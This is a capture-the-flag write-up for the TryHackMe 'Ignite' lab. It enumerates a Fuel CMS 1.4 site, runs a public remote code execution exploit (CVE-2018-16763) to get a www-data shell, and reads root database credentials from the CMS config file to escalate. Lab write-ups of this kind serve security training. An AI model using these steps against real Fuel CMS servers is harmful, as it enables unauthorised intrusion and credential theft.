# TryHackMe: Ignite

## Initial Enumeration

First, let's start with a basic Nmap scan to discover open ports and services:

```bash
nmap -A -p- -T4 10.48.144.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 10:48 +06
Nmap scan report for 10.48.144.132
Host is up (0.081s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18
| http-robots.txt: 1 disallowed entry
|_/fuel/
```

### Key Findings:
- Only port 80 is open (HTTP)
- Apache 2.4.18 web server
- Discovered `/fuel/` in robots.txt

## Web Enumeration

Upon visiting port 80, we discovered:
- Default installation page of Fuel CMS (version 1.4)
- Admin panel URL with default credentials
- Successfully logged in with default credentials (unchanged)

## Vulnerability Assessment

Searching for known vulnerabilities in Fuel CMS 1.4:

```bash
searchsploit fuel CMS 1.4
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                            | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                            | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                            | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)                           | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                  | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                      | php/webapps/48778.txt
-------------------------------------------------------------------------------------- ---------------------------------
```

### Locating the Exploit

```bash
searchsploit -p 47138
  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
    Codes: CVE-2018-16763
```

## Initial Access

Testing the RCE exploit:

```bash
python3 /usr/share/exploitdb/exploits/php/webapps/50477.py --url http://10.10.160.108/
[+]Connecting...
Enter Command $id
systemuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Note on Command Execution
The initial exploit has a limitation where commands run independently and don't maintain state. For example:

```bash
Enter Command $pwd
system/var/www/html

Enter Command $cd /home
system

Enter Command $pwd
system/var/www/html
```

To overcome this limitation, a custom modified version of the exploit was created.

## Privilege Escalation

1. Ran LinPEAS for system enumeration
2. Found interesting configuration file: `/var/www/html/fuel/application/config/database.php`
3. Retrieved database credentials from the config file:

```php
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'REDACTED',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
)
```

### Root Access
Successfully switched to root using the discovered password and accessed the root flag.

## Flags
- User flag location: `/home/www-data/`
- Root flag: Accessible after privilege escalation
